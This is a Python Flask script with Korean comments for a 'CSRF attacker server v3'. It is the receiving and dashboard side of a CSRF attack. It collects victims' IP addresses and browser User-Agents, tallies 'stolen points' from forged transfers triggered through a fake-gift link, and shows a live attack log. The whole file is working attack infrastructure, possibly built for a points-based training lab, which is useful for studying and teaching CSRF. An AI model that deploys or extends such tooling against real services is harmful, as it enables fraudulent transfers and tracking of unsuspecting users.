#!/usr/bin/env python3
"""
CSRF 공격자 서버 v3 (Flask)
중복 방지 및 정확한 카운팅
"""

from flask import Flask, request, jsonify, render_template_string
from datetime import datetime
import time

app = Flask(__name__)

# 공격 로그 저장
attack_logs = []
stolen_points = 0
victims = {}
recent_transfers = {}  # IP별 최근 전송 기록 (중복 방지)

# 메인 대시보드 HTML (동일)
DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>🎯 CSRF Attack Dashboard</title>
    <meta http-equiv="refresh" content="3">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            color: white;
            padding: 20px;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        h1 { text-align: center; margin-bottom: 30px; font-size: 2.5em; }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        .stat-card {
            background: rgba(255,255,255,0.1);
            padding: 30px;
            border-radius: 15px;
            text-align: center;
            backdrop-filter: blur(10px);
        }
        .stat-card h2 { font-size: 3em; margin: 10px 0; color: #4CAF50; }
        .stat-card p { font-size: 1.2em; opacity: 0.9; }
        .logs {
            background: rgba(255,255,255,0.1);
            padding: 20px;
            border-radius: 15px;
            backdrop-filter: blur(10px);
            max-height: 600px;
            overflow-y: auto;
        }
        .log-entry {
            background: rgba(255,255,255,0.1);
            padding: 15px;
            margin-bottom: 10px;
            border-radius: 10px;
            border-left: 4px solid #4CAF50;
        }
        .log-entry.victim { border-left-color: #ff9800; }
        .log-entry.points { border-left-color: #f44336; }
        .log-entry.duplicate { border-left-color: #999; opacity: 0.6; }
        .timestamp { font-size: 0.9em; opacity: 0.7; }
        .victim-table {
            width: 100%;
            margin-top: 20px;
            border-collapse: collapse;
        }
        .victim-table th {
            background: rgba(255,255,255,0.2);
            padding: 15px;
            text-align: left;
        }
        .victim-table td {
            padding: 12px 15px;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        .refresh-info {
            text-align: center;
            margin-top: 20px;
            opacity: 0.7;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎯 CSRF Attack Control Panel v3</h1>

        <div class="stats">
            <div class="stat-card">
                <p>💰 탈취한 포인트</p>
                <h2>{{ stolen_points }}</h2>
            </div>
            <div class="stat-card">
                <p>👥 피해자 수</p>
                <h2>{{ victim_count }}</h2>
            </div>
            <div class="stat-card">
                <p>📊 총 공격 시도</p>
                <h2>{{ total_attacks }}</h2>
            </div>
        </div>

        <div class="logs">
            <h2>📋 실시간 공격 로그</h2>
            {% if attack_logs %}
                {% for log in attack_logs[::-1][:20] %}
                <div class="log-entry {{ log.type }}">
                    <div class="timestamp">{{ log.timestamp }}</div>
                    <div><strong>{{ log.event }}</strong></div>
                    {% if log.details %}
                    <div style="margin-top: 5px; font-size: 0.9em; opacity: 0.8;">
                        {{ log.details }}
                    </div>
                    {% endif %}
                </div>
                {% endfor %}
            {% else %}
                <p style="text-align: center; opacity: 0.5; padding: 40px;">
                    대기 중... 피해자가 fake-gift 링크를 클릭하면 여기에 표시됩니다.
                </p>
            {% endif %}
        </div>

        {% if victims %}
        <div class="logs" style="margin-top: 20px;">
            <h2>👥 피해자 목록</h2>
            <table class="victim-table">
                <thead>
                    <tr>
                        <th>IP</th>
                        <th>User-Agent</th>
                        <th>탈취 포인트</th>
                        <th>마지막 접속</th>
                    </tr>
                </thead>
                <tbody>
                    {% for ip, data in victims.items() %}
                    <tr>
                        <td>{{ ip }}</td>
                        <td>{{ data.user_agent[:50] }}...</td>
                        <td><strong>{{ data.points }}P</strong></td>
                        <td>{{ data.last_seen }}</td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>
        </div>
        {% endif %}

        <div class="refresh-info">⟳ 3초마다 자동 새로고침 | v3 - 중복 방지</div>
    </div>
</body>
</html>
"""

@app.after_request
def after_request(response):
    """CORS 헤더 추가"""
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization')
    response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
    return response

@app.route('/')
def dashboard():
    """메인 대시보드"""
    return render_template_string(
        DASHBOARD_HTML,
        stolen_points=stolen_points,
        victim_count=len(victims),
        total_attacks=len(attack_logs),
        attack_logs=attack_logs,
        victims=victims
    )

@app.route('/notify')
def notify():
    """페이지 로드 알림"""
    event = request.args.get('event', 'unknown')
    log_event('notify', f'알림: {event}', f'IP: {request.remote_addr}')
    return jsonify({'status': 'ok'})

@app.route('/victim')
def victim():
    """피해자 정보 수집"""
    ip = request.remote_addr
    points = int(request.args.get('points', 0))
    user_agent = request.headers.get('User-Agent', 'Unknown')

    if ip not in victims:
        victims[ip] = {
            'points': 0,
            'user_agent': user_agent,
            'first_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'last_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        # 세션 시작 시 전송 기록 초기화
        recent_transfers[ip] = {}

    victims[ip]['last_seen'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    log_event(
        'victim',
        f'🎯 피해자 감지!',
        f'IP: {ip}, 예상 차감: {points}P'
    )

    return jsonify({'status': 'ok'})

@app.route('/transfer')
def transfer():
    """포인트 전송 알림 (중복 방지)"""
    global stolen_points

    amount = int(request.args.get('amount', 0))
    ip = request.remote_addr
    current_time = time.time()

    # 중복 체크: 같은 IP에서 같은 금액을 5초 이내에 다시 요청하면 무시
    if ip not in recent_transfers:
        recent_transfers[ip] = {}

    transfer_key = str(amount)

    if transfer_key in recent_transfers[ip]:
        last_time = recent_transfers[ip][transfer_key]
        if current_time - last_time < 5:  # 5초 이내 중복
            log_event(
                'duplicate',
                f'⚠️ 중복 요청 무시',
                f'IP: {ip}, {amount}P (5초 이내 중복)'
            )
            return jsonify({'status': 'duplicate', 'total': stolen_points})

    # 중복이 아니면 카운트
    recent_transfers[ip][transfer_key] = current_time
    stolen_points += amount

    if ip in victims:
        victims[ip]['points'] = victims[ip].get('points', 0) + amount

    log_event(
        'points',
        f'💰 포인트 탈취!',
        f'IP: {ip}, +{amount}P (총: {stolen_points}P)'
    )

    return jsonify({'status': 'ok', 'total': stolen_points})

@app.route('/complete')
def complete():
    """공격 완료"""
    total = int(request.args.get('total', 0))
    ip = request.remote_addr

    log_event(
        'complete',
        f'✅ 공격 완료!',
        f'IP: {ip}, 시도한 차감: {total}P'
    )

    # 완료 시 해당 IP의 전송 기록 정리
    if ip in recent_transfers:
        recent_transfers[ip] = {}

    return jsonify({'status': 'ok'})

@app.route('/logs')
def logs():
    """로그 JSON으로 반환"""
    return jsonify({
        'stolen_points': stolen_points,
        'victims': len(victims),
        'logs': attack_logs
    })

@app.route('/reset')
def reset():
    """통계 초기화"""
    global stolen_points, attack_logs, victims, recent_transfers
    stolen_points = 0
    attack_logs = []
    victims = {}
    recent_transfers = {}
    log_event('system', '🔄 통계 초기화', 'Admin')
    return jsonify({'status': 'reset'})

def log_event(event_type, event, details=''):
    """이벤트 로깅"""
    attack_logs.append({
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'type': event_type,
        'event': event,
        'details': details
    })

    if len(attack_logs) > 500:
        attack_logs.pop(0)

    print(f"[{datetime.now().strftime('%H:%M:%S')}] {event} - {details}")

if __name__ == '__main__':
    print("="*60)
    print("🎯 CSRF Attack Server v3 Starting...")
    print("="*60)
    print("")
    print("📊 Dashboard: http://0.0.0.0:5000/")
    print("📋 Logs API:  http://0.0.0.0:5000/logs")
    print("🔄 Reset:     http://0.0.0.0:5000/reset")
    print("")
    print("✨ 개선사항:")
    print("  - 중복 요청 필터링 (5초 이내)")
    print("  - 정확한 포인트 카운팅")
    print("  - 세션별 전송 기록 관리")
    print("")
    print("="*60)

    log_event('system', '🚀 서버 시작 v3', 'Port 5000 - 중복 방지 기능')

    app.run(host='0.0.0.0', port=5000, debug=False)
